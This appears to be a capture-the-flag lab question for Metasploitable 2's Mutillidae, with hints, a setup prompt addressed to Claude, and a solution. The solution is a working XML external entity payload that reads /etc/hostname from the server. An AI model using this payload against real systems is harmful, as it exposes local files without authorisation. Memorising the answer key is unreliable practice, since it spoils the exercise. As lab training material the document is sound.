# Q082 — XXE in Mutillidae

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🔴 Hard |
| **Tools** | `burpsuite (or curl)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Mutillidae has an XML External Entity input. Provide payload to read `/etc/hostname`.

---

## 🎯 Flag Format

```
payload=<xml>
```

Example: `payload=<!DOCTYPE x [<!ENTITY a SYSTEM 'file:///etc/hostname'>]><x>&a;</x>`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

DOCTYPE + ENTITY trick.
</details>

<details>
<summary>Hint 2</summary>

Use `file://` URI.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# POST as XML to mutillidae XXE page
```

Returns hostname.

**Answer:** `payload=<!DOCTYPE x [<!ENTITY a SYSTEM 'file:///etc/hostname'>]><x>&a;</x>`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q082:
1. Verify Metasploitable2 up; Mutillidae reachable.
2. Set Mutillidae Security Level=0 (link at top of Mutillidae pages).
3. Initialize/reset DB on first run.

Report back: "Lab ready for Q082 — Mutillidae reachable with security=0".
```
